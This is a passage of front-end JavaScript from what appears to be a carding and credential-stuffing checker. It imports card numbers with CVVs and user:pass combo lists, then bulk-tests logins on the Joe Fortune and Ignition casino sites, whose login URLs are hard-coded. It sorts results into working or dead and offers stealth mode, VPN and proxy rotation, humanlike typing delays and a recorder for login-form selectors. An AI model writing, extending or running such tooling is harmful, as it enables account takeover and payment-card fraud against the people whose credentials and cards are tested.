  $(`${prefix}StatusDot`).className = 'status-dot' + (isRunning ? ' running' : '');
  $(`${prefix}StatusLabel`).textContent = isRunning ? 'Running…' : 'Idle';
  $(`${prefix}RunBtn`).classList.toggle('hidden', isRunning || untested === 0);
  $(`${prefix}StopBtn`).classList.toggle('hidden', !isRunning);
  $(`${prefix}CredsTitle`).textContent = `Credentials (${total})`;

  let visible = creds;
  if (filter === 'untested')  visible = creds.filter(c => c.status === CredStatus.UNTESTED);
  else if (filter === 'working')  visible = creds.filter(c => c.status === CredStatus.WORKING);
  else if (filter === 'noAcc')    visible = creds.filter(c => c.status === CredStatus.NO_ACC || c.status === CredStatus.PERM_DISABLED);
  else if (filter === 'disabled') visible = creds.filter(c => c.status === CredStatus.TEMP_DISABLED);

  const listEl  = $(`${prefix}CredList`);
  const emptyEl = $(`${prefix}Empty`);
  const batchEl = $(`${prefix}BatchBar`);

  if (total === 0) {
    emptyEl.classList.remove('hidden');
    listEl.innerHTML = '';
    batchEl.classList.add('hidden');
    return;
  }
  emptyEl.classList.add('hidden');

  listEl.innerHTML = visible.map(c => {
    const sel = selIds.has(c.id);
    const sc  = credStatusClass(c.status);
    const sl  = credStatusLabel(c.status);
    return `
    <li class="card-item cred-item${sel ? ' selected' : ''}${c.status === CredStatus.TESTING ? ' checking' : ''}" data-id="${c.id}" data-site="${site}">
      <div class="card-checkbox" data-check="${c.id}">${sel ? '✓' : ''}</div>
      <div class="card-info">
        <div class="card-number cred-username">${c.username}</div>
        <div class="card-meta">
          <span>••••••••</span>
          ${c.testHistory.length > 0 ? `<span>${c.testHistory.length} test${c.testHistory.length !== 1 ? 's' : ''}</span>` : ''}
        </div>
      </div>
      <div class="card-right">
        <span class="status-badge ${sc}">${sl}</span>
      </div>
    </li>`;
  }).join('');

  const nSel = selIds.size;
  batchEl.classList.toggle('hidden', nSel === 0);
  $(`${prefix}SelectedCount`).textContent = nSel > 0 ? `${nSel} selected` : '';
  $(`${prefix}CheckSelectedBtn`).textContent = `▶ Check Selected (${nSel})`;
}

// ── Render Sessions ────────────────────────────────────────
/**
 * Re-renders the Sessions tab: filtered session list, Screenshots button count,
 * and Recordings button count.
 */
function renderSessions() {
  let filtered = state.sessions;
  const f = state.sessionFilter;
  if (f === 'ppsr')          filtered = filtered.filter(s => !s.type || s.type === 'ppsr');
  else if (f === 'joe')      filtered = filtered.filter(s => s.type === 'joe');
  else if (f === 'ignition') filtered = filtered.filter(s => s.type === 'ign' || s.type === 'ignition');
  else if (f === 'working')  filtered = filtered.filter(s => s.result === 'working');
  else if (f === 'dead')     filtered = filtered.filter(s => s.result === 'dead' || s.result === 'error');

  $('sessionsTitle').textContent = `Sessions (${state.sessions.length})`;
  const shotsBtn = $('openScreenshotsBtn');
  if (shotsBtn) shotsBtn.textContent = `🖼 Screenshots (${state.debugShots.length})`;
  const recBtn = $('openRecordingsBtn');
  if (recBtn) recBtn.textContent = getRecordingsButtonLabel(state.recordings);

  const list  = $('sessionList');
  const empty = $('sessionsEmpty');
  if (filtered.length === 0) {
    empty.classList.remove('hidden');
    list.innerHTML = '';
    return;
  }
  empty.classList.add('hidden');

  const icons    = { working: '✅', dead: '❌', error: '⚠️', testing: '🔄' };
  const siteLabel = t => t === 'joe' ? '🎰 Joe' : (t === 'ign' || t === 'ignition') ? '🔥 Ign' : '💳 PPSR';

  list.innerHTML = filtered.slice(0, 200).map(s => {
    const label = s.username ? s.username : (s.cardNum ? maskedNumber(s.cardNum) : '–');
    const sub   = s.brand || '';
    return `
    <li class="session-item">
      <span class="session-icon">${icons[s.result] || '❓'}</span>
      <div class="session-info">
        <div class="session-card">${label}</div>
        <div class="session-detail">
          <span class="site-tag-mini">${siteLabel(s.type)}</span>
          ${sub ? `<span>${sub}</span>` : ''}
          <span>${s.detail || ''}</span>
        </div>
      </div>
      <div class="session-right">
        <div class="session-time">${timeAgo(s.ts)}</div>
        <div class="session-dur">${s.durationMs ? s.durationMs + 'ms' : ''}</div>
      </div>
    </li>`;
  }).join('');
}

// ── Render WireGuard Config List ───────────────────────────
/**
 * Re-renders the WireGuard config list inside the Settings tab Network/VPN section.
 * Each config shows endpoint host:port, status (Enabled/Disabled), and action buttons.
 */
function renderWgConfigs() {
  const list = $('wgConfigList');
  if (!list) return;
  if (state.wireGuardConfigs.length === 0) {
    list.innerHTML = '<div class="wg-empty">No WireGuard configs imported yet.</div>';
    return;
  }
  list.innerHTML = state.wireGuardConfigs.map(cfg => `
    <div class="wg-config-item${cfg.isEnabled ? '' : ' wg-disabled'}" data-wg-id="${cfg.id}">
      <div class="wg-config-info">
        <div class="wg-endpoint">${cfg.endpointHost}:${cfg.endpointPort}</div>
        <div class="wg-meta">${cfg.fileName} · ${cfg.isEnabled ? '✅ Enabled' : '⏸ Disabled'}</div>
      </div>
      <div class="wg-config-actions">
        <button class="icon-text-btn wg-toggle-btn" data-wg-action="toggle" data-wg-id="${cfg.id}">${cfg.isEnabled ? 'Disable' : 'Enable'}</button>
        <button class="icon-text-btn wg-delete-btn" data-wg-action="delete" data-wg-id="${cfg.id}">🗑</button>
      </div>
    </div>`).join('');
}

// ── Render Settings ────────────────────────────────────────
/**
 * Re-renders the Settings tab: syncs all input fields and toggles with current state.
 * Also updates AI key status display, NordLynx key status, and WireGuard config list.
 */
function renderSettings() {
  const { settings, grokKey, nordAccessKey } = state;

  // Grok AI section
  const configured = grokKey.length > 0;
  $('aiIcon').textContent = configured ? '🛡️' : '🔒';
  $('aiSub').textContent  = configured ? 'API key saved' : 'Not configured';
  $('aiSub').className    = 'ai-sub' + (configured ? ' configured' : '');
  $('deleteKeyBtn').style.display = configured ? '' : 'none';

  // Nord key section
  const nordConfigured = nordAccessKey.length > 0;
  if ($('nordKeyStatus')) $('nordKeyStatus').textContent = nordConfigured ? '✅ NordLynx key saved' : 'No key saved';
  if ($('deleteNordKeyBtn')) $('deleteNordKeyBtn').style.display = nordConfigured ? '' : 'none';

  // Target URLs
  if ($('joeLoginUrl'))      $('joeLoginUrl').value      = settings.joeLoginUrl;
  if ($('ignitionLoginUrl')) $('ignitionLoginUrl').value = settings.ignitionLoginUrl;

  // PPSR settings
  $('maxConcurrency').value = settings.maxConcurrency;
  $('checkTimeout').value   = settings.checkTimeout;
  $('autoRetry').checked    = settings.autoRetry;
  $('stealthMode').checked  = settings.stealthMode;
  $('ppsrUrl').value        = settings.ppsrUrl;

  // Login settings
  $('loginConcurrency').value    = settings.loginConcurrency;
  $('loginTimeout').value        = settings.loginTimeout;
  $('testEmail').value           = settings.testEmail;
  $('useEmailRotation').checked  = settings.useEmailRotation;
  $('debugScreenshots').checked  = settings.debugScreenshots !== false;

  // Automation settings
  if ($('typingSpeedMin')) $('typingSpeedMin').value = settings.typingSpeedMinMs;
  if ($('typingSpeedMax')) $('typingSpeedMax').value = settings.typingSpeedMaxMs;
  if ($('requeueOnTimeout')) $('requeueOnTimeout').checked = settings.requeueOnTimeout;
  if ($('requeueOnFailure')) $('requeueOnFailure').checked = settings.requeueOnFailure;
  if ($('maxRequeueCount')) $('maxRequeueCount').value = settings.maxRequeueCount;
  if ($('batchDelay'))      $('batchDelay').value      = settings.batchDelayBetweenStartsMs;
  if ($('pageLoadTimeout')) $('pageLoadTimeout').value = settings.pageLoadTimeout;

  // Network/VPN settings
  if ($('vpnRotation'))         $('vpnRotation').checked         = settings.vpnRotation;
  if ($('dnsRotation'))         $('dnsRotation').checked         = settings.dnsRotation;
  if ($('proxyRotateOnFail'))   $('proxyRotateOnFail').checked   = settings.proxyRotateOnFailure;

  applyTheme(settings.theme);
  renderWgConfigs();
}

// ── Render All ──────────────────────────────────────────────
/**
 * Calls all individual render functions to fully synchronise the UI with state.
 * Used after state mutations that can affect multiple tabs simultaneously.
 * Inside worker loops, use scheduleRender() instead to avoid jank (BUG-07).
 */
function renderAll() {
  renderDashboard();
  renderCards();
  renderWorking();
  renderCredSite('joe');
  renderCredSite('ign');
  renderSessions();
  renderSettings();
  renderBlacklist();
  renderFlowRecorder();
}

// ── Badge helper ────────────────────────────────────────────
/**
 * Updates a badge element with a count. Hides the badge when count is zero.
 * @param {string} id - Element ID of the badge span.
 * @param {number} n - Count to display.
 */
function updateBadge(id, n) {
  const el = $(id);
  if (!el) return;
  if (n > 0) { el.textContent = n > 99 ? '99+' : n; el.classList.remove('hidden'); }
  else { el.classList.add('hidden'); }
}

// ── Time helper ─────────────────────────────────────────────
/**
 * Returns a human-readable relative time string for a Unix timestamp.
 * @param {number} ts - Unix timestamp in milliseconds.
 * @returns {string} Relative time string such as "just now", "5m ago", "2h ago", or a date string.
 */
function timeAgo(ts) {
  const diff = Date.now() - ts;
  if (diff < 60000)    return 'just now';
  if (diff < 3600000)  return `${Math.floor(diff / 60000)}m ago`;
  if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
  return new Date(ts).toLocaleDateString();
}


// ── Import Cards Modal ─────────────────────────────────────
/** @type {Array} Parsed cards staged for import (cleared on modal open/close). */
let importParsed = [];

/**
 * Opens the Import Cards modal and resets its state.
 * Focuses the textarea after a brief delay for immediate paste capability.
 */
function openImport() {
  $('importText').value = '';
  $('importFeedback').innerHTML = '<span class="hint-text">Formats: NUM|MM|YY|CVV · NUM MM YY CVV · NUM/MM/YY/CVV</span>';
  $('confirmImport').disabled = true;
  $('confirmImport').textContent = 'Add 0 Cards';
  importParsed = [];
  $('importModal').classList.remove('hidden');
  setTimeout(() => $('importText').focus(), 50);
}

/** @description Closes the Import Cards modal. */
function closeImport() { $('importModal').classList.add('hidden'); }

/**
 * Handles textarea input in the Import Cards modal.
 * Parses the current text, deduplicates against existing cards, and updates
 * the feedback line and confirm button accordingly.
 */
function onImportInput() {
  const text = $('importText').value;
  const allParsed = smartParseCards(text);
  const existing  = new Set(state.cards.map(c => c.number));
  importParsed = allParsed.filter(c => !existing.has(c.number));
  const dupes = allParsed.length - importParsed.length;

  const fb = $('importFeedback');
  if (!text.trim()) {
    fb.innerHTML = '<span class="hint-text">Formats: NUM|MM|YY|CVV · NUM MM YY CVV · NUM/MM/YY/CVV</span>';
    $('confirmImport').disabled = true;
    $('confirmImport').textContent = 'Add 0 Cards';
  } else if (importParsed.length > 0) {
    let msg = `<span class="parse-success">✓ ${importParsed.length} card(s) detected</span>`;
    if (dupes > 0) msg += `<span class="hint-text"> · ${dupes} duplicate(s) skipped</span>`;
    fb.innerHTML = msg;
    $('confirmImport').disabled = false;
    $('confirmImport').textContent = `Add ${importParsed.length} Card${importParsed.length !== 1 ? 's' : ''}`;
  } else {
    fb.innerHTML = `<span class="parse-error">No valid cards detected${dupes > 0 ? ' (all duplicates)' : ''}</span>`;
    $('confirmImport').disabled = true;
    $('confirmImport').textContent = 'Add 0 Cards';
  }
}

/**
 * Confirms the card import: pushes staged cards into state, saves, and re-renders.
 * Closes the modal and shows a success toast.
 */
function confirmImport() {
  if (importParsed.length === 0) return;
  state.cards.push(...importParsed);
  saveCards();
  toast(`Added ${importParsed.length} card(s)`, 'success');
  closeImport();
  renderAll();
}

// ── Card Detail Modal ──────────────────────────────────────
/**
 * Opens the Card Detail modal for the given card ID.
 * Displays card metadata and test history.
 * testHistory entries have field `result` (not `status`) — this is intentional per BUG-15 docs.
 * @param {string} id - UUID of the card to display.
 */
function openCardDetail(id) {
  const c = state.cards.find(c => c.id === id);
  if (!c) return;
  state.detailCardId = id;
  $('detailTitle').textContent = `${c.brandIcon} ${c.brand} ····${c.number.slice(-4)}`;

  const historyHtml = c.testHistory.length > 0
    ? `<div class="detail-section">
        <div class="settings-section-header">Test History</div>
        <div class="test-history-list">
          ${c.testHistory.slice(0, 20).map(h => `
            <div class="test-history-row">
              <span>${h.result === 'working' ? '✅' : h.result === 'dead' ? '❌' : '⚠️'} ${h.result}</span>
              <span>${h.detail || ''}</span>
              <span>${timeAgo(h.ts)}</span>
            </div>`).join('')}
        </div>
      </div>` : '';

  $('detailBody').innerHTML = `
    <div class="detail-section">
      <div class="detail-row"><span class="detail-key">Number</span><span class="detail-val">${c.number}</span></div>
      <div class="detail-row"><span class="detail-key">Expiry</span><span class="detail-val">${c.mm}/${c.yy}</span></div>
      <div class="detail-row"><span class="detail-key">CVV</span><span class="detail-val">${c.cvv}</span></div>
      <div class="detail-row"><span class="detail-key">Brand</span><span class="detail-val">${c.brand}</span></div>
      <div class="detail-row"><span class="detail-key">Status</span><span class="detail-val status-badge ${c.status}">${c.status}</span></div>
      <div class="detail-row"><span class="detail-key">Tests</span><span class="detail-val">${c.successCount} worked / ${c.totalTests} total</span></div>
      <div class="detail-row"><span class="detail-key">Added</span><span class="detail-val">${new Date(c.addedAt).toLocaleString()}</span></div>
      ${c.lastTested ? `<div class="detail-row"><span class="detail-key">Last tested</span><span class="detail-val">${timeAgo(c.lastTested)}</span></div>` : ''}
    </div>
    ${historyHtml}`;

  $('checkCardBtn').disabled = state.isRunning || c.status === Status.TESTING;
  $('cardDetailModal').classList.remove('hidden');
}

/** @description Closes the Card Detail modal and clears the detailCardId state. */
function closeCardDetail() {
  $('cardDetailModal').classList.add('hidden');
  state.detailCardId = null;
}

// ── Import Credentials Modal ───────────────────────────────
/** @type {Array} Parsed credentials staged for import (cleared on modal open/close). */
let importCredParsed = [];

/**
 * Opens the Import Credentials modal for the given site.
 * Sets the modal title, resets the textarea, and stores the site in state.
 * @param {'joe'|'ign'} site - The site for which to import credentials.
 */
function openImportCred(site) {
  state.importCredSite = site;
  const siteName = site === 'joe' ? 'Joe Fortune' : 'Ignition';
  $('importCredTitle').textContent = `Import ${siteName} Credentials`;
  $('importCredText').value = '';
  $('importCredFeedback').innerHTML = '<span class="hint-text">Formats: user:pass · user|pass · user;pass · user,pass · user pass</span>';
  $('confirmImportCred').disabled = true;
  $('confirmImportCred').textContent = 'Add 0 Credentials';
  importCredParsed = [];
  $('importCredModal').classList.remove('hidden');
  setTimeout(() => $('importCredText').focus(), 50);
}

/**
 * Closes the Import Credentials modal and clears importCredSite from state.
 */
function closeImportCred() {
  $('importCredModal').classList.add('hidden');
  state.importCredSite = null;
}

/**
 * Handles textarea input in the Import Credentials modal.
 * BUG-02 fix: guards against null importCredSite before accessing the credential array.
 * Parses the current text, deduplicates against existing credentials for the correct site,
 * and updates the feedback line and confirm button.
 */
function onImportCredInput() {
  const site = state.importCredSite;
  if (!site) { toast('Import session lost — please reopen', 'error'); return; }
  const text     = $('importCredText').value;
  const allParsed = smartParseCreds(text);
  const existing  = new Set((site === 'joe' ? state.joeCreds : state.ignCreds).map(c => c.username + ':' + c.password));
  importCredParsed = allParsed.filter(c => !existing.has(c.username + ':' + c.password));
  const dupes = allParsed.length - importCredParsed.length;

  const fb = $('importCredFeedback');
  if (!text.trim()) {
    fb.innerHTML = '<span class="hint-text">Formats: user:pass · user|pass · user;pass · user,pass · user pass</span>';
    $('confirmImportCred').disabled = true;
    $('confirmImportCred').textContent = 'Add 0 Credentials';
  } else if (importCredParsed.length > 0) {
    let msg = `<span class="parse-success">✓ ${importCredParsed.length} credential(s) detected</span>`;
    if (dupes > 0) msg += `<span class="hint-text"> · ${dupes} duplicate(s) skipped</span>`;
    fb.innerHTML = msg;
    $('confirmImportCred').disabled = false;
    $('confirmImportCred').textContent = `Add ${importCredParsed.length} Credential${importCredParsed.length !== 1 ? 's' : ''}`;
  } else {
    fb.innerHTML = `<span class="parse-error">No valid credentials detected${dupes > 0 ? ' (all duplicates)' : ''}</span>`;
    $('confirmImportCred').disabled = true;
    $('confirmImportCred').textContent = 'Add 0 Credentials';
  }
}

/**
 * Confirms the credential import: pushes staged credentials into the correct site's array.
 * BUG-02 fix: guards against null importCredSite — shows error and returns early if null.
 * Saves, closes modal, re-renders, and shows a success toast.
 */
function confirmImportCred() {
  if (importCredParsed.length === 0) return;
  const site = state.importCredSite;
  if (!site) { toast('Import session lost — please reopen the import dialog', 'error'); return; }
  let blacklistedCount = 0;
  const toImport = importCredParsed.map(c => {
    if (isBlacklisted(c.username)) {
      blacklistedCount++;
      return { ...c, status: CredStatus.PERM_DISABLED };
    }
    return c;
  });
  if (site === 'joe') { state.joeCreds.push(...toImport); saveJoeCreds(); }
  else                { state.ignCreds.push(...toImport); saveIgnCreds(); }
  let msg = `Added ${toImport.length} credential(s)`;
  if (blacklistedCount > 0) msg += ` — ${blacklistedCount} auto-marked Perm Disabled (blacklist)`;
  toast(msg, 'success');
  closeImportCred();
  renderAll();
}

// ── Blacklist ──────────────────────────────────────────────
/**
 * Adds usernames parsed from the blacklist textarea to the blacklist.
 * Accepts the same formats as credential import (user:pass, user|pass, plain email, etc.)
 * — only the username portion is stored. Deduplicates against existing entries.
 * Saves and re-renders the blacklist section.
 */
function importBlacklist() {
  const raw = ($('blacklistImportText').value || '').trim();
  if (!raw) return;
  const lines = raw.split(/\r?\n/).map(l => l.trim()).filter(Boolean);
  let added = 0;
  for (const line of lines) {
    const username = line.split(/[:;|, \t]/)[0].trim();
    if (!username) continue;
    if (!isBlacklisted(username)) {
      state.blacklist.push({ id: crypto.randomUUID(), username, ts: Date.now(), note: '' });
      added++;
    }
  }
  saveBlacklist();
  $('blacklistImportText').value = '';
  renderBlacklist();
  toast(added > 0 ? `${added} username(s) added to blacklist` : 'All entries already in blacklist', added > 0 ? 'success' : 'info');
}

/**
 * Removes a single entry from the blacklist by ID.
 * @param {string} id - The blacklist entry UUID to remove.
 */
function removeBlacklistEntry(id) {
  state.blacklist = state.blacklist.filter(b => b.id !== id);
  saveBlacklist();
  renderBlacklist();
}

/**
 * Re-renders the blacklist list and count in the Settings panel.
 * Shows each blacklisted username with a remove button.
 */
function renderBlacklist() {
  const countEl = $('blacklistCount');
  const listEl  = $('blacklistList');
  if (!countEl || !listEl) return;
  const n = state.blacklist.length;
  countEl.textContent = `${n} entr${n === 1 ? 'y' : 'ies'}`;
  if (n === 0) {
    listEl.innerHTML = '<div class="settings-note" style="padding:6px 0">No entries yet.</div>';
    return;
  }
  listEl.innerHTML = state.blacklist.map(b => `
    <div class="blacklist-row">
      <span class="blacklist-username">${b.username}</span>
      <button class="icon-text-btn danger" data-bl-remove="${b.id}">✕</button>
    </div>`).join('');
}

// ── Flow Recorder ──────────────────────────────────────────

/** @description Labels for the 4 recorded flow selectors displayed in Settings. */
const FLOW_STEP_LABELS = ['Cookie Dismiss', 'Email Field', 'Password Field', 'Submit Button'];

/**
 * Saves the recorded flow selectors for the given site to localStorage.
 * @param {'joe'|'ign'} site
 * @param {string[]|null} selectors
 */
function saveFlow(site, selectors) {
  const key = site === 'joe' ? KEY_JOE_FLOW : KEY_IGN_FLOW;
  try {
    if (selectors) localStorage.setItem(key, JSON.stringify(selectors));
    else localStorage.removeItem(key);
  } catch {}
}

/**
 * Re-renders the Flow Recorder UI in Settings for both sites.
 * Shows recorded selectors (if any) and the Record / Clear buttons.
 */
function renderFlowRecorder() {
  ['joe', 'ign'].forEach(site => {
    const flow = site === 'joe' ? state.joeFlow : state.ignFlow;
    const statusEl  = $(`${site}FlowStatus`);
    const detailEl  = $(`${site}FlowDetail`);
    const recordBtn = $(`${site}FlowRecordBtn`);
    const clearBtn  = $(`${site}FlowClearBtn`);
    if (!statusEl) return;

    if (flow && Array.isArray(flow) && flow.length === 4) {
      statusEl.textContent = '✅ Recorded';
      statusEl.className = 'flow-status recorded';
      detailEl.innerHTML = flow.map((sel, i) =>
        `<div class="flow-step-row"><span class="flow-step-label">${FLOW_STEP_LABELS[i]}</span><code class="flow-step-sel">${sel}</code></div>`
      ).join('');
      if (clearBtn) clearBtn.classList.remove('hidden');
    } else {
      statusEl.textContent = 'Not recorded';
      statusEl.className = 'flow-status';
      detailEl.innerHTML = '<div class="settings-note" style="padding:4px 0">No flow recorded yet. Click Record to open a browser and manually click each element.</div>';
      if (clearBtn) clearBtn.classList.add('hidden');
    }
    if (recordBtn) recordBtn.disabled = false;
  });
}

/**
 * Starts a flow recording session for the given site.
 * Opens a headed browser on the login page via the server API, then polls
 * /api/record-flow/status every 800ms to update the step indicator in the UI.
 * When the POST resolves, saves the selectors and re-renders.
 * @param {'joe'|'ign'} site
 */
async function startFlowRecording(site) {
  const loginUrl = site === 'joe'
    ? (state.settings.joeLoginUrl || 'https://joefortunepokies.win/login')
    : (state.settings.ignitionLoginUrl || 'https://ignitioncasino.ooo/?overlay=login');

  const statusEl  = $(`${site}FlowStatus`);
  const detailEl  = $(`${site}FlowDetail`);
  const recordBtn = $(`${site}FlowRecordBtn`);
  if (recordBtn) recordBtn.disabled = true;
  if (statusEl) { statusEl.textContent = '🔴 Recording…'; statusEl.className = 'flow-status recording'; }
  if (detailEl) detailEl.innerHTML = '<div class="flow-step-row"><span class="flow-step-label">Step 1/4</span><span class="settings-note">A browser window will open — follow the on-screen instructions</span></div>';

  // Poll status while POST is in-flight
  let pollInterval = setInterval(async () => {
    try {
      const r = await fetch('/api/record-flow/status');
      const d = await r.json();
      if (!d.active) return;
      if (statusEl) statusEl.textContent = `🔴 Step ${d.step + 1}/4`;
      if (detailEl && d.step < 4) {
        detailEl.innerHTML = `<div class="flow-step-row"><span class="flow-step-label">Step ${d.step + 1}/4</span><span class="settings-note">${d.label}</span></div>`;
      }
    } catch {}
  }, 800);

  try {
    const res = await fetch('/api/record-flow', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ loginUrl }),
    });
    const data = await res.json();
    clearInterval(pollInterval);

    if (data.error) {
      toast(`Recording failed: ${data.error}`, 'error');
      if (statusEl) { statusEl.textContent = '❌ Failed'; statusEl.className = 'flow-status'; }
      if (recordBtn) recordBtn.disabled = false;
      return;
    }

    if (site === 'joe') state.joeFlow = data.selectors;
    else                state.ignFlow = data.selectors;
    saveFlow(site, data.selectors);
    toast(`${site === 'joe' ? 'Joe Fortune' : 'Ignition'} flow recorded!`, 'success');
    renderFlowRecorder();

  } catch (err) {
    clearInterval(pollInterval);
    toast(`Recording error: ${err.message}`, 'error');
    if (statusEl) { statusEl.textContent = '❌ Failed'; statusEl.className = 'flow-status'; }
    if (recordBtn) recordBtn.disabled = false;
  }
}

// ── Credential Detail Modal ────────────────────────────────
/**
 * Opens the Credential Detail modal for the given site and credential ID.
 * Shows credential metadata and test history.
 * Note: credential testHistory entries use the field name `status` (not `result`).
 * @param {'joe'|'ign'} site - Which site the credential belongs to.
 * @param {string} id - UUID of the credential to display.
 */
function openCredDetail(site, id) {
  const creds = site === 'joe' ? state.joeCreds : state.ignCreds;
  const c = creds.find(x => x.id === id);
  if (!c) return;
  state.detailCredSite = site;
  state.detailCredId   = id;
  const siteName = site === 'joe' ? '🎰 Joe Fortune' : '🔥 Ignition';
  $('credDetailTitle').textContent = `${siteName} — ${c.username}`;

  const histHtml = c.testHistory.length > 0
    ? `<div class="detail-section">
        <div class="settings-section-header">Test History</div>
        ${c.testHistory.slice(0, 20).map(h => `
          <div class="test-history-row">
            <span>${h.status === CredStatus.WORKING ? '✅' : h.status === CredStatus.TEMP_DISABLED ? '⏸' : '❌'} ${credStatusLabel(h.status)}</span>
            <span>${h.detail || ''}</span>
            <span>${timeAgo(h.ts)}</span>
          </div>`).join('')}
      </div>` : '';

  $('credDetailBody').innerHTML = `
    <div class="detail-section">
      <div class="detail-row"><span class="detail-key">Username</span><span class="detail-val">${c.username}</span></div>
      <div class="detail-row"><span class="detail-key">Password</span><span class="detail-val">${'•'.repeat(Math.min(c.password.length, 12))}</span></div>
      <div class="detail-row"><span class="detail-key">Status</span><span class="detail-val status-badge ${credStatusClass(c.status)}">${credStatusLabel(c.status)}</span></div>
      <div class="detail-row"><span class="detail-key">Tests</span><span class="detail-val">${c.testHistory.length}</span></div>
      <div class="detail-row"><span class="detail-key">Added</span><span class="detail-val">${new Date(c.addedAt).toLocaleString()}</span></div>
    </div>
    ${histHtml}`;

  const isRunning = site === 'joe' ? state.joeRunning : state.ignRunning;
  $('checkCredBtn').disabled = isRunning || c.status === CredStatus.TESTING;
  $('credDetailModal').classList.remove('hidden');
}

/** @description Closes the Credential Detail modal and clears credential detail state fields. */
function closeCredDetail() {
  $('credDetailModal').classList.add('hidden');
  state.detailCredSite = null;
  state.detailCredId   = null;
}

// ── Confirm Modal ──────────────────────────────────────────
/**
 * Opens the generic confirm modal with a title, message, and callback.
 * The callback is invoked when the user clicks OK.
 * @param {string} title - Modal title text.
 * @param {string} message - Body message text.
 * @param {Function} cb - Callback to invoke on confirmation.
 */
function openConfirm(title, message, cb) {
  $('confirmTitle').textContent   = title;
  $('confirmMessage').textContent = message;
  state.confirmCallback = cb;
  $('confirmModal').classList.remove('hidden');
}

/** @description Closes the confirm modal and clears the pending callback. */
function closeConfirm() {
  $('confirmModal').classList.add('hidden');
  state.confirmCallback = null;
}

// ── Progress Overlay ───────────────────────────────────────
/** @type {'ppsr'|'joe'|'ign'} Tracks which run type owns the progress overlay. */
let _progressRunType = 'ppsr';

/**
 * Shows the run progress overlay with a title and sets the run type context.
 * @param {string} title - Descriptive title shown at the top of the overlay.
 * @param {'ppsr'|'joe'|'ign'} [runType='ppsr'] - Run type for the cancel button routing.
 */
function showProgress(title, runType = 'ppsr') {
  _progressRunType = runType;
  $('progressTitle').textContent = title;
  $('progressBarFill').style.width = '0%';
  $('progressStats').textContent = '0 / 0';
  $('progressSub').textContent = '';
  $('progressWorking').textContent = '0 working';
  $('progressDead').textContent = '0 dead';
  $('progressOverlay').classList.remove('hidden');
}

/**
 * Routes the progress overlay Cancel button to the correct stop function
 * based on which run type is currently active.
 */
function stopAnyRun() {
  if (_progressRunType === 'joe') stopLoginChecks('joe');
  else if (_progressRunType === 'ign') stopLoginChecks('ign');
  else stopRun();
}

/**
 * Updates the progress bar fill, stats counter, and optional sub-label in the overlay.
 * @param {number} done - Number of items completed so far.
 * @param {number} total - Total number of items in the run.
 * @param {string} [sub=''] - Optional sub-label (e.g., "3 working · 2 dead").
 */
function updateProgress(done, total, sub = '') {
  const pct = total > 0 ? Math.round(done / total * 100) : 0;
  $('progressBarFill').style.width = pct + '%';
  $('progressStats').textContent = `${done} / ${total}`;
  $('progressSub').textContent = sub;
}

/** @description Hides the run progress overlay. */
function hideProgress() {
  $('progressOverlay').classList.add('hidden');
}


// ── Simulation helpers ─────────────────────────────────────
/**
 * FNV-1a 32-bit hash function used for deterministic seeded simulation.
 * Produces a float in [0, 1) from any string input.
 * @param {string} seed - Input string to hash.
 * @returns {number} Deterministic float in range [0, 1).
 */
function hashUnit(seed) {
  let h = 0x811c9dc5;
  for (let i = 0; i < seed.length; i++) {
    h ^= seed.charCodeAt(i);
    h = Math.imul(h, 0x01000193);
  }
  return (h >>> 0) / 4294967295;
}

/**
 * Returns a deterministic delay in milliseconds within [minMs, maxMs]
 * derived from the given seed string. Used to simulate realistic network latency.
 * @param {string} seed - Base seed string.
 * @param {number} minMs - Minimum delay in milliseconds.
 * @param {number} maxMs - Maximum delay in milliseconds.
 * @returns {number} Deterministic delay in milliseconds.
 */
function seededDelay(seed, minMs, maxMs) {
  const span = Math.max(0, maxMs - minMs);
  return minMs + Math.round(hashUnit(seed + ':delay') * span);
}

/**
 * Derives a deterministic login outcome from a seed string.
 * Distribution: ~30% WORKING, ~50% NO_ACC, ~12% PERM_DISABLED, ~8% TEMP_DISABLED.
 * @param {string} seed - Fully qualified seed (includes site ID and credential values).
 * @param {string} siteId - Stable site identifier ('joe' or 'ign') for the detail message.
 * @returns {{ status: string, detail: string }} Outcome object.
 */
function loginOutcomeFromSeed(seed, siteId) {
  const r = hashUnit(seed);
  const siteName = siteId === 'joe' ? 'Joe Fortune' : 'Ignition';
  if (r < 0.30) return { status: CredStatus.WORKING,       detail: `Login successful on ${siteName}` };
  if (r < 0.80) return { status: CredStatus.NO_ACC,        detail: 'No account found or wrong credentials' };
  if (r < 0.92) return { status: CredStatus.PERM_DISABLED, detail: 'Account has been permanently disabled' };
  return           { status: CredStatus.TEMP_DISABLED, detail: 'Account temporarily disabled' };
}

/**
 * Derives a deterministic PPSR check outcome from a seed string.
 * Distribution: ~35% working, ~50% dead, ~15% error.
 * @param {string} seed - Fully qualified seed (includes card number, expiry, cvv).
 * @returns {{ result: string, detail: string }} Outcome object.
 */
function ppsrOutcomeFromSeed(seed) {
  const r = hashUnit(seed);
  if (r < 0.35) return { result: 'working', detail: 'PPSR check passed — no encumbrance' };
  if (r < 0.85) return { result: 'dead',    detail: 'Declined — encumbrance or invalid' };
  return           { result: 'error',   detail: 'Connection error — retrying' };
}

// ── Script loader ──────────────────────────────────────────
/**
 * Dynamically loads an external script by appending a <script> tag to <head>.
 * Resolves when the script loads, rejects on error.
 * @param {string} url - URL of the script to load.
 * @returns {Promise<boolean>} Resolves to true on success.
 * @throws {Error} If the script fails to load.
 */
function loadScript(url) {
  return new Promise((resolve, reject) => {
    const s = document.createElement('script');
    s.src = url; s.async = true;
    s.onload = () => resolve(true);
    s.onerror = () => reject(new Error(`Failed to load ${url}`));
    document.head.appendChild(s);
  });
}

/** @type {Promise|null} Cached html2canvas load promise (prevents duplicate script loading). */
let _html2canvasPromise = null;

/**
 * Lazily loads html2canvas from CDN with a fallback mirror.
 * Returns the cached module if already loaded. Uses a shared promise to
 * prevent duplicate concurrent loads.
 * @returns {Promise<Function>} Resolves to the html2canvas function.
 * @throws {Error} If both CDN and fallback fail to load.
 */
async function loadHtml2Canvas() {
  if (window.html2canvas) return window.html2canvas;
  if (_html2canvasPromise) return _html2canvasPromise;
  _html2canvasPromise = (async () => {
    try {
      await loadScript('https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js');
    } catch {
      await loadScript('https://unpkg.com/html2canvas@1.4.1/dist/html2canvas.min.js');
    }
    if (!window.html2canvas) throw new Error('html2canvas unavailable');
    return window.html2canvas;
  })().catch(err => { _html2canvasPromise = null; throw err; });
